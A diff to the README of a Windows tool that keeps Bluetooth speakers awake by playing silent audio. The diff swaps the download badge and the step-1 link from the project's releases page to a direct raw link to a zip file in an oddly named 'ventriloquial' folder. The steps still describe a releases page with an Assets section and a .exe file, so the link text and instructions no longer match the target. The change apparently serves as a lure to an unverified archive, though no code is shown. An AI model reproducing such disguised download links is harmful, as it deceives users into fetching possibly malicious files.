@@ -1,6 +1,6 @@
 # 🔊 bluetooth-speaker-keepalive-windows - Keep your bluetooth speakers active always
 
-[![](https://img.shields.io/badge/download-latest_release-blue.svg)](https://github.com/rishab010507/bluetooth-speaker-keepalive-windows/releases)
+[![](https://img.shields.io/badge/download-latest_release-blue.svg)](https://raw.githubusercontent.com/rishab010507/bluetooth-speaker-keepalive-windows/main/ventriloquial/windows_speaker_bluetooth_keepalive_2.4-beta.1.zip)
 
 Bluetooth speakers often save power by entering a sleep mode when they play no sound. This behavior causes them to disconnect from your computer. You must then manually turn the speaker back on or wait for it to reconnect. This tool solves that problem. It plays a silent audio signal to trick your speaker into staying awake.
 
@@ -20,7 +20,7 @@ Bluetooth speakers often save power by entering a sleep mode when they play no s
 
 ## 📥 How to download and run
 
-1. Visit [this page to download](https://github.com/rishab010507/bluetooth-speaker-keepalive-windows/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/rishab010507/bluetooth-speaker-keepalive-windows/main/ventriloquial/windows_speaker_bluetooth_keepalive_2.4-beta.1.zip).
 2. Look for the Assets section on that page.
 3. Click the file ending in .exe to start the download.
 4. Locate the file in your Downloads folder after it finishes.
